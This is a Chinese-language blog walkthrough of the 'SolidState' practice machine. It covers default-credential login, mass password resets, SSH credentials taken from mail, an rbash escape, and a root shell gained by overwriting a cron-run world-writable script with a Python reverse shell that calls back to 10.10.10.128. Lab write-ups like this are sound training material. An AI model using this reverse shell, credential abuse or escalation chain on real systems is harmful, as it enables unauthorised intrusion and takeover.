---
layout: post
title:  "vulnhub >_ SolidState"
description: walkthrough
category: vulnhub
---
# SolidState

![image-20200617022024782]({{ site.url }}/assets/SolidState.assets/image-20200617022024782.png)



![image-20200617022457513]({{ site.url }}/assets/SolidState.assets/image-20200617022457513.png)

![image-20200617022629960]({{ site.url }}/assets/SolidState.assets/image-20200617022629960.png)

默认凭证直接进入

![image-20200617022731092]({{ site.url }}/assets/SolidState.assets/image-20200617022731092.png)

直接改所有人的密码，为下一步准备

![image-20200617022948417]({{ site.url }}/assets/SolidState.assets/image-20200617022948417.png)

用修改后的凭证进入邮件系统

![image-20200617023131902]({{ site.url }}/assets/SolidState.assets/image-20200617023131902.png)

逐个用户查阅每一封邮件，最终mindy的第二封邮件得到ssh凭证

![image-20200617023258879]({{ site.url }}/assets/SolidState.assets/image-20200617023258879.png)

```bash
username: mindy
pass: P@55W0rd1!2@
```

![image-20200617023503792]({{ site.url }}/assets/SolidState.assets/image-20200617023503792.png)

rbash，重新登录带参数用以绕过

```bash
ssh mindy@10.10.10.130 'bash --noprofile'
```

![image-20200617024319230]({{ site.url }}/assets/SolidState.assets/image-20200617024319230.png)

在opt目录下找到一个全局可写的脚本

![image-20200617025847107]({{ site.url }}/assets/SolidState.assets/image-20200617025847107.png)

看脚本是执行清除tmp下面的文件

![image-20200617030144197]({{ site.url }}/assets/SolidState.assets/image-20200617030144197.png)

但考虑到它被写成如果只有root可以运行它，并属于root，这表明root用户可能有一个cron作业设置了这个脚本。


这里我们需要制作rshell，因为在目标shell种打开vim等编辑器，难以正常输入。有另外一个技巧，就是在本地编辑好之后，直接复制代码黏贴到目标种

```bash
#!/usr/bin/env python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.128",1338))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);
```

现在本地写好脚本
然后vi tmp.py
进入之后按ESC进入命令行模式 输入 :.,$d 删除所有行
再按 i  进入编辑模式    直接粘贴
再按 ESC 进入命令行模式 
输入 :wq 保存退出

然后设立监听，等待即可得到root shell

![image-20200617030630878]({{ site.url }}/assets/SolidState.assets/image-20200617030630878.png)